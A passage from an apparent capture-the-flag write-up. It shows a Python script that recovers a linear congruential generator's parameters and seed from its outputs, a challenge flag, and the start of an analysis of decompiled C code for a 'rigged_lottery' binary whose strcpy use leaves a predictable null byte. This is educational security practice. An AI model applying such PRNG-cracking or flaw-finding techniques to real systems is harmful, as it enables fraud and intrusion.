    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">g </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">:
        </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;modinv for </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;"> does not exist&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span style="color:#ccc9c2;">(a))
    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">x </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">m

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_increment</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">modulus</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">multiplier</span><span style="color:#ccc9c2;">):
    increment </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">] </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">states[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">]</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">multiplier) </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">modulus
    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">modulus, multiplier, increment

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_multiplier</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">modulus</span><span style="color:#ccc9c2;">):
    multiplier </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(states[</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2;">] </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">]) </span><span style="color:#f29e74;">* </span><span style="color:#ffd580;">modinv</span><span style="color:#ccc9c2;">(states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">] </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">states[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">modulus) </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">modulus
    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">crack_unknown_increment</span><span style="color:#ccc9c2;">(states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">modulus</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">multiplier)


</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_modulus</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2;">):
    diffs </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[s1 </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">s0 </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">s0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">s1 </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span style="color:#ccc9c2;">(states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ccc9c2;">])]
    zeroes </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[t2</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">t0 </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">t1</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">t1 </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">t0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">t1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">t2 </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span style="color:#ccc9c2;">(diffs</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">diffs[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">diffs[</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ccc9c2;">])]
    modulus </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">abs</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">reduce</span><span style="color:#ccc9c2;">(gcd</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">zeroes))
    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">crack_unknown_multiplier</span><span style="color:#ccc9c2;">(states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">modulus)


values </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[
    </span><span style="color:#ffcc66;">585065537</span><span style="color:#ccc9c2cc;">,
    </span><span style="color:#ffcc66;">141094830</span><span style="color:#ccc9c2cc;">,
    </span><span style="color:#ffcc66;">1117894293</span><span style="color:#ccc9c2cc;">,
    </span><span style="color:#ffcc66;">2053819234</span><span style="color:#ccc9c2cc;">,
    </span><span style="color:#ffcc66;">1325680659</span><span style="color:#ccc9c2cc;">,
    </span><span style="color:#ffcc66;">1213377283</span><span style="color:#ccc9c2cc;">,
</span><span style="color:#ccc9c2;">]

n, m, c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">crack_unknown_modulus</span><span style="color:#ccc9c2;">(values)
</span><span style="color:#f28779;">print</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;n = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">, m = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">, c = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">(n</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">m</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">c))

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_next</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">num</span><span style="color:#ccc9c2;">):
	</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">(num </span><span style="color:#f29e74;">* </span><span style="color:#ccc9c2;">m) </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">n

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_prev</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">num</span><span style="color:#ccc9c2;">):
	</span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">modinv</span><span style="color:#ccc9c2;">(m</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">n) </span><span style="color:#f29e74;">* </span><span style="color:#ccc9c2;">num </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">n

values</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span style="color:#ccc9c2;">(</span><span style="color:#ffd580;">get_next</span><span style="color:#ccc9c2;">(values[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">]))
</span><span style="color:#f28779;">print</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;predicted year = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">values[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">])

hops </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">876578

</span><span style="color:#f28779;">print</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;seed = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span style="color:#f28779;">reduce</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">lambda </span><span style="color:#ffcc66;">acc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">x</span><span style="color:#ccc9c2;">: </span><span style="color:#ffd580;">get_prev</span><span style="color:#ccc9c2;">(acc)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">[x </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(hops)]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2020</span><span style="color:#ccc9c2;">))
</span></code></pre>
<p>flag: HTB{l1n34r_c0n9ru3nc35_4nd_prn91Zz}</p>
<h1 id="rigged-lottery">rigged_lottery</h1>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">Is everything in life completely random? Are we unable to change our fate? Or maybe we can change the future and even manipulate randomness?! Is luck even a thing? Try your &quot;luck&quot;!
</span></code></pre><h2 id="initial-review-1">initial review</h2>
<h3 id="main">main</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  </span><span style="color:#ffd580;">setup</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffd580;">welcome</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffd580;">generate</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">do </span><span style="color:#ccc9c2;">{
    </span><span style="color:#ffd580;">menu</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">} </span><span style="color:#ffa759;">while</span><span style="color:#ccc9c2;">( </span><span style="color:#ffcc66;">true </span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>I will omit setup &amp; welcome because they don't have anything interesting -- just writing a welcome message and setting io buffer settings.  Otherwise, nothing interesting to note here except that generate gets called once before we get to do anything. </p>
<h3 id="generate">generate</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">generate</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> local_44</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> local_40</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> local_3c</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2;"> local_38 [</span><span style="color:#ffcc66;">40</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> local_10</span><span style="color:#ccc9c2cc;">;
  
</span><span style="color:#ccc9c2;">  local_10 </span><span style="color:#f29e74;">= *</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  local_44 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  local_40 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(_flag </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
    </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Length of number (1-32): &quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffd580;">__isoc99_scanf</span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">DAT_00102073</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">local_44)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">((local_44 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x22</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">&amp;&amp; </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#f29e74;">&lt;</span><span style="color:#ccc9c2;"> local_44)) {
      </span><span style="color:#f28779;">memset</span><span style="color:#ccc9c2;">(local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;">)local_44)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">      local_3c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;/dev/urandom&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_3c </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
        </span><span style="color:#f28779;">fwrite</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Error opening /dev/urandom, exiting..</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x27</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">stderr)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
        </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x69</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ccc9c2;">}
      </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(local_3c</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;">)local_44)</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffa759;">while </span><span style="color:#ccc9c2;">(local_40 </span><span style="color:#f29e74;">&lt;</span><span style="color:#ccc9c2;"> local_44) {
        </span><span style="color:#ffa759;">while </span><span style="color:#ccc9c2;">(local_38[local_40] </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&#39;</span><span style="color:#ccc9c2;">) {
          </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(local_3c</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_38 </span><span style="color:#f29e74;">+</span><span style="color:#ccc9c2;"> local_40</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
        </span><span style="color:#ccc9c2;">}
        local_40 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> local_40 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ccc9c2;">}
      </span><span style="color:#f28779;">strcpy</span><span style="color:#ccc9c2;">(lucky_number</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_38)</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffd580;">close</span><span style="color:#ccc9c2;">(local_3c)</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Lucky number generated successfuly! Try your luck!&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
    </span><span style="color:#ffa759;">else </span><span style="color:#ccc9c2;">{
      </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Invalid size!&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
  }
  </span><span style="color:#ffa759;">else </span><span style="color:#ccc9c2;">{
    _flag </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">    local_3c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;/dev/urandom&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_3c </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
      </span><span style="color:#f28779;">fwrite</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Error opening /dev/urandom, exiting..</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x27</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">stderr)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
      </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x22</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
    </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(local_3c</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">lucky_number</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x21</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffd580;">close</span><span style="color:#ccc9c2;">(local_3c)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_10 </span><span style="color:#f29e74;">!= *</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)) {
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
    </span><span style="color:#ffd580;">__stack_chk_fail</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>The generate function has two main branches: the else branch runs the first time this function is called and populates <code>lucky_number</code> with random numbers.  The <code>if _flag == 0</code> branch runs any time after the first because <code>_flag</code> is set to 0 in the else branch.  It will ask for a number between 0 and 32, read that many bytes from /dev/urandom, and then use <code>strcpy</code> to move those bytes to <code>lucky_number</code>.  It should be noted that <code>strcpy</code> is meant to copy strings not raw bytes and has a couple peculiarites.  Namely that it also copies the terminating null byte from the source (because C strings are always null terminated).  The implication here is that if we generate a number of bytes smaller than the max size of <code>lucky_number</code> it will leave a null byte in <code>lucky_number</code></p>
<h3 id="menu">menu</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">menu</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> local_14</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> local_10</span><span style="color:#ccc9c2cc;">;
  
</span><span style="color:#ccc9c2;">  local_10 </span><span style="color:#f29e74;">= *</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(</span><span style="color:#ffa759;">double</span><span style="color:#ccc9c2;">)cosy_coins</span><span style="color:#ccc9c2cc;">,
                  
         </span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Current cosy coins: </span><span style="color:#ffcc66;">%.2f</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">1. Generate lucky number.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">2. Play game.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">3. Claimprize.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">4. Exit.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;
        </span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffd580;">__isoc99_scanf</span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">DAT_00102073</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">local_14)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_14 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2;">) {
    </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Goodbye!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
    </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x45</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_14 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2;">) {
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_14 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2;">) {
      </span><span style="color:#ffd580;">claim</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffa759;">goto</span><span style="color:#ccc9c2;"> code_r0x0010174a</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_14 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2;">) {
      </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_14 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">) {
        </span><span style="color:#ffd580;">generate</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
        </span><span style="color:#ffa759;">goto</span><span style="color:#ccc9c2;"> code_r0x0010174a</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ccc9c2;">}
      </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_14 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2;">) {
        </span><span style="color:#ffd580;">play</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
        </span><span style="color:#ffa759;">goto</span><span style="color:#ccc9c2;"> code_r0x0010174a</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ccc9c2;">}
    }
  }
  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Invalid option!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffd580;">menu</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#73d0ff;">code_r0x0010174a</span><span style="color:#ccc9c2cc;">:
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_10 </span><span style="color:#f29e74;">== *</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)) {
    </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
  </span><span style="color:#ffd580;">__stack_chk_fail</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>Nothing super interesting here: we can either regenerate lucky numbers, play the game, or claim a prize.</p>
<h3 id="play">play</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">play</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> iVar1</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">float</span><span style="color:#ccc9c2;"> local_18</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> local_14</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> local_10</span><span style="color:#ccc9c2cc;">;
  
</span><span style="color:#ccc9c2;">  local_10 </span><span style="color:#f29e74;">= *</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">How many coins do you want to bet?&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffd580;">__isoc99_scanf</span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">DAT_001020e4</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">local_18)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  cosy_coins </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> cosy_coins </span><span style="color:#f29e74;">-</span><span style="color:#ccc9c2;"> local_18</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">coin_check</span><span style="color:#ccc9c2;">((ulong)(</span><span style="font-style:italic;color:#5ccfe6;">uint</span><span style="color:#ccc9c2;">)cosy_coins)</span><span style="color:#ccc9c2cc;">;
